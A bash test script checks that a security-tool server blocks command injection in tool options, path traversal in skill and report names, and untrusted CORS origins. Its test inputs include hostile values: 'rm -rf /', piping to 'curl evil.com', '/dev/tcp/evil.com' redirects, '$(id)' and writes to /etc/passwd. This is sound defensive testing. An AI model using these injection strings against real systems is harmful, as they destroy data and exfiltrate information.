#!/bin/bash
# Test: Security controls - rate limiting, risk policy, injection protection
set -euo pipefail

BASE_URL="${MCP_BASE_URL:-http://localhost:3000}"
PASS=0; FAIL=0

pass() { echo "[PASS] $1"; ((PASS+=1)); }
fail() { echo "[FAIL] $1: $2"; ((FAIL+=1)); }

reject_check() {
  local name="$1"
  local tool="$2"
  local target="$3"
  local options="$4"
  local R
  R=$(curl -sf -X POST "$BASE_URL/api/tools/dry-run" \
    -H "Content-Type: application/json" \
    -d "{\"tool\":\"$tool\",\"target\":\"$target\",\"options\":\"$options\"}")
  echo "$R" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if not d.get('success') else 1)" \
    && pass "Blocked: $name" \
    || fail "Not blocked: $name" "command was allowed"
}

echo "=== Security Controls ==="

echo "-- Risk Policy: blocked tokens --"
reject_check "semicolon"     "whatweb" "example.com" "-a 1; rm -rf /"
reject_check "pipe"          "whatweb" "example.com" "-a 1 | curl evil.com"
reject_check "and-and"       "whatweb" "example.com" "-a 1 && id"
reject_check "or-or"         "whatweb" "example.com" "-a 1 || id"
reject_check "backtick"      "whatweb" "example.com" '\`id\`'
reject_check "dollar-paren"  "whatweb" "example.com" '$(id)'
reject_check "redirect-out"  "whatweb" "example.com" "-a 1 > /etc/passwd"
reject_check "redirect-in"   "whatweb" "example.com" "-a 1 < /etc/shadow"
reject_check "newline"       "whatweb" "example.com" '-a 1\nid'

echo "-- Risk Policy: blocked patterns --"
reject_check "dev-tcp"       "whatweb" "example.com" "--proxy /dev/tcp/evil.com/80"
reject_check "dev-udp"       "whatweb" "example.com" "--proxy /dev/udp/evil.com/53"

echo "-- Skill name validation --"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/skills/../../etc/passwd")
[ "$CODE" = "404" ] && pass "Path traversal in skill name -> 404" || fail "Path traversal" "got $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/skills/nmap;id")
[ "$CODE" = "404" ] && pass "Special chars in skill name -> 404" || fail "Special chars skill" "got $CODE"

echo "-- Report filename validation --"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/reports/..evil")
[ "$CODE" = "400" ] && pass "Report traversal rejected -> 400" || fail "Report traversal" "got $CODE"

echo "-- Rate limiting headers --"
# Fazer múltiplas requisições para verificar que o servidor não crasha
for i in {1..5}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/health")
  [ "$CODE" = "200" ] || { fail "Rate test req $i" "got $CODE"; break; }
done
pass "Multiple requests to /health succeed"

echo "-- CORS headers --"
CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: http://evil.example" "$BASE_URL/health")
[ "$CODE" = "403" ] && pass "CORS rejects untrusted origin" || fail "CORS untrusted origin" "got $CODE"

R=$(curl -si -H "Origin: http://localhost:3000" "$BASE_URL/health" 2>/dev/null | head -20)
echo "$R" | grep -qi "Access-Control-Allow-Origin: http://localhost:3000" \
  && pass "CORS allows configured localhost origin" \
  || fail "CORS localhost origin" "not allowed"
echo "$R" | grep -q "Access-Control-Allow-Origin: \\*" \
  && fail "CORS wildcard" "wildcard origin must not be used" \
  || pass "CORS wildcard not present"

echo ""
echo "Results: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
